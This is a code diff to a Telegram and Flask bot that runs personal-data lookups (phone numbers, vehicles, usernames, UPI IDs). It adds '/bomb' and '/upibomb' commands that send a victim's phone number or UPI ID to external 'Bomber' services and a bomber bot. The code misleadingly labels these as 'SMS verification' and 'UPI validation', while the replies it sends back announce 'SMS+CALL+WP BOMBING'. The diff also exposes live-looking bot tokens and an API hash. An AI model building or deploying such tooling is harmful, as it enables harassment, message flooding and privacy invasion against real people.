@@ -11,6 +11,7 @@ import uuid
 from datetime import datetime, timedelta
 import threading
 from deep_translator import GoogleTranslator
+import aiohttp
 
 # ------------------ CONFIGURATION ------------------
 logging.basicConfig(
@@ -23,6 +24,7 @@ api_hash = '3359532bba54756f12424148064e3e4d'
 session_string = None  # <- fill this after first login (optional)
 group_username = '@freeicmr'
 sherlok_username = '@Sherlok7777bot'
+paradox_username = '@paradoxbomber_bot'
 bot_token = '8454361876:AAH_fRlPZICNBkPOptJX1EwIJ4gbZKLyzYk'
 new_bot_token = '8265714572:AAHnGWZl_5IhpiK9Qia27xncTyMW5iiNnFo'  # Add your new bot token here
 
@@ -67,6 +69,11 @@ async def main():
     await client.send_message(sherlok_entity, "/start")
     await asyncio.sleep(2)
     logging.info(f"Sent /start to {sherlok_username}")
+    
+    paradox_entity = await client.get_entity(paradox_username)
+    await client.send_message(paradox_entity, "/start")
+    await asyncio.sleep(2)
+    logging.info(f"Sent /start to {paradox_username}")
     
     await bot.start(bot_token=bot_token)
     await new_bot.start(bot_token=new_bot_token)
@@ -140,6 +147,9 @@ Available commands:
 /vnum <vnum> - Search by vnum
 /fastag <fastag> - Search by fastag
 /username <username> - Search by username
+/fam <fam id> - Search by fam
+/upibomb <upi id> - Validate UPI ID
+/bomb <10 digits number> - Send SMS verification
 /help - Show this list
 """
 
@@ -187,6 +197,32 @@ Available commands:
         user_input = event.raw_text.split(maxsplit=1)[1]
         result = await perform_username_search(user_input)
         await event.reply(json.dumps(result, indent=2))
+
+    @new_bot.on(events.NewMessage(pattern=r'/fam (.+)'))
+    async def fam_handler(event):
+        user_input = event.raw_text.split(maxsplit=1)[1]
+        result = await perform_fam_search(user_input)
+        await event.reply(json.dumps(result, indent=2))
+
+    @new_bot.on(events.NewMessage(pattern=r'/upibomb (.+)'))
+    async def upibomb_handler(event):
+        user_input = event.raw_text.split(maxsplit=1)[1]
+        result = await perform_upi_validation(user_input)
+        await event.reply(json.dumps(result, indent=2))
+
+    @new_bot.on(events.NewMessage(pattern=r'/bomb (.+)'))
+    async def bomb_handler(event):
+        user_input = event.raw_text.split(maxsplit=1)[1]
+        results = await asyncio.gather(
+            perform_sms_verify(user_input),
+            perform_paradox_sms_verify(user_input)
+        )
+        # Check if both succeeded
+        if all(r['status'] == 'success' for r in results):
+            await event.reply("SMS VERIFICATION SENT SUCCESSFULLY ✅👍🏻")
+        else:
+            errors = [r['message'] for r in results if r['status'] != 'success']
+            await event.reply(json.dumps({"status": "error", "message": " ".join(errors)}))
 
     await asyncio.gather(client.run_until_disconnected(), bot.run_until_disconnected(), new_bot.run_until_disconnected())
 
@@ -356,6 +392,84 @@ async def perform_username_search(user_input: str) -> dict:
         client.remove_event_handler(handler)
         client.remove_event_handler(edit_handler)
 
+# ------------------ SEARCH FUNCTION FOR FAM ------------------
+async def perform_fam_search(user_input: str) -> dict:
+    url = f"https://financing-firm-adapter-page.trycloudflare.com/?upi={user_input}"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    try:
+                        return await response.json()
+                    except aiohttp.ContentTypeError:
+                        text = await response.text()
+                        return {"status": "success", "message": text}
+                else:
+                    return {"status": "error", "message": f"HTTP {response.status}"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+# ------------------ UPI VALIDATION FUNCTION ------------------
+async def perform_upi_validation(upi_id: str) -> dict:
+    encoded_upi = upi_id.replace('@', '%40')
+    url = f"https://mr-ags.fun/Bomb/upibomb.php?upi={encoded_upi}&submit=api+Now"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    return {"status": "success", "message": "UPI BOMBING DONE SUCCESSFULLY ✅ 👍🏻"}
+                else:
+                    return {"status": "error", "message": f"HTTP {response.status}"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+# ------------------ SMS VERIFY FUNCTION (HTTP) ------------------
+async def perform_sms_verify(number: str) -> dict:
+    url = f"https://unitedcamps.in/Bomber/?number={number}&key=JERRY"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    return {"status": "success", "message": "SMS VERIFICATION SENT SUCCESSFULLY ✅👍🏻"}
+                else:
+                    return {"status": "error", "message": f"HTTP {response.status}"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+# ------------------ SMS VERIFY FUNCTION (PARADOX BOT) ------------------
+async def perform_paradox_sms_verify(user_input: str) -> dict:
+    final_response = None
+    final_response_received = asyncio.Event()
+    bot_entity = await client.get_entity(paradox_username)
+
+    async def handler(event):
+        nonlocal final_response
+        msg_lower = event.message.message.lower()
+        if "searching" not in msg_lower and "please wait" not in msg_lower:
+            final_response = event.message.message
+            final_response_received.set()
+
+    client.add_event_handler(handler, events.NewMessage(from_users=bot_entity))
+
+    try:
+        await client.send_message(bot_entity, f"/bomb {user_input}")
+        try:
+            await asyncio.wait_for(final_response_received.wait(), timeout=30)
+        except asyncio.TimeoutError:
+            return {"status": "error", "message": "No response received (timeout)."}
+
+        if final_response:
+            return {"status": "success", "message": "SMS VERIFICATION SENT SUCCESSFULLY ✅👍🏻"}
+        else:
+            return {"status": "error", "message": "No response received."}
+
+    except FloodWaitError as e:
+        return {"status": "error", "message": "Wait 10 seconds before making another request"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+    finally:
+        client.remove_event_handler(handler)
+
 # ------------------ FLASK ROUTE ------------------
 @app.route("/", methods=["GET"])
 def root():
@@ -404,16 +518,37 @@ def root():
     params = request.args.copy()
     params.pop('api_key', None)
     if not params:
-        return jsonify({"error": "Please provide a query parameter like ?num=9685748596 or ?vehicle=DL10AB1234 or ?username=@hello"})
+        return jsonify({"error": "Please provide a query parameter like ?num=9685748596 or ?vehicle=DL10AB1234 or ?username=@hello or ?fam=rohit@fam or ?upibomb=hello@ptyes or ?bomb=9685748596"})
     if len(params) > 1:
         return jsonify({"error": "Please provide only one query parameter."})
     command, value = next(iter(params.items()))
 
     if command == 'username':
         future = asyncio.run_coroutine_threadsafe(perform_username_search(value), loop)
+        result = future.result()
+    elif command == 'fam':
+        future = asyncio.run_coroutine_threadsafe(perform_fam_search(value), loop)
+        result = future.result()
+    elif command == 'upibomb':
+        future = asyncio.run_coroutine_threadsafe(perform_upi_validation(value), loop)
+        result = future.result()
+    elif command == 'bomb':
+        future1 = asyncio.run_coroutine_threadsafe(perform_sms_verify(value), loop)
+        future2 = asyncio.run_coroutine_threadsafe(perform_paradox_sms_verify(value), loop)
+        result1 = future1.result()
+        result2 = future2.result()
+        if result1['status'] == 'success' and result2['status'] == 'success':
+            result = {"status": "success", "message": "HARD SMS+CALL+WP BOMBING DONE SUCCESSFULLY ✅👍🏻"}
+        else:
+            errors = []
+            if result1['status'] != 'success':
+                errors.append(result1['message'])
+            if result2['status'] != 'success':
+                errors.append(result2['message'])
+            result = {"status": "error", "message": " ".join(errors)}
     else:
         future = asyncio.run_coroutine_threadsafe(perform_search(command, value), loop)
-    result = future.result()
+        result = future.result()
     return jsonify(result)
 
 # ------------------ ENTRY POINT ------------------
